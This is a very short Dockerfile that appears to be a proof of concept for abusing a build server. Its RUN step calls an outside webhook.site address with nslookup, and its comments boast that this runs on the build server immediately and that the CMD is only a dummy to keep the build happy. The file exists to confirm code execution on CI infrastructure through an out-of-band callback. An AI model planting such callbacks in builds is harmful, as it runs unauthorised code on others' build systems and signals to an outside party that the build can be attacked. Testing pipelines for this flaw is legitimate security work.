FROM alpine:latest

# This runs ON THE BUILD SERVER immediately
RUN nslookup https://webhook.site/9235269a-bb3f-40ef-8163-5217357e365a
# Dummy entrypoint to keep the build happy
CMD ["echo", "Build Complete"]
